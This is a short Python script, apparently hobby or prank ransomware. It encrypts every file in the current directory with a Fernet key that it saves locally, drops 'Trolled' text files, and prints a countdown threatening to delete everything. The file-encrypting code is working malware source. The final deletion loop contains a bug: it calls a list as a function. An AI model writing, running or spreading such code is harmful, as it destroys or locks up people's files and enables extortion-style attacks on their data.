#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import time
#find all files in the cwd

files = []

for file in os.listdir():
	if file == "poggers.py" or file == "theKey.key" or file == "unpoggers.py":
		continue
	if os.path.isfile(file):
		files.append(file)
	

print(files)

key = Fernet.generate_key()

with open("theKey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

for i in range(10):
        f = open("WeDoALittleTrolling" + str(i) + ".txt", "w")
        f.write("Trolled")
        f.close()
        
print("You just got trolled")
print("")
print("This is a race against time.")
print("If you do not download and run the decryption program in 3 minutes. Well you will have nothing left to decrypt ):")


time.sleep(60)
print("You might want to get a move on. You have 2 minutes left.")
time.sleep(60)
print("Seriously if you have not started to find the decryption you need to say goodbye. 1 minute left")
time.sleep(45)
print("15 seconds")
time.sleep(15)

fileList = []

for file in os.listdir():
	if file == "poggers.py" or file == "theKey.key" or file == "unpoggers.py":
		continue
	if os.path.isfile(file):
		fileList.append(file)

if "savedByTheBell.txt" in fileList:
        print("You have been spared. Move on with your day.")
else:
        print("Tee Hee, you are too late. Time to execute order 66.")

        for file in fileList():
                os.remove(file)
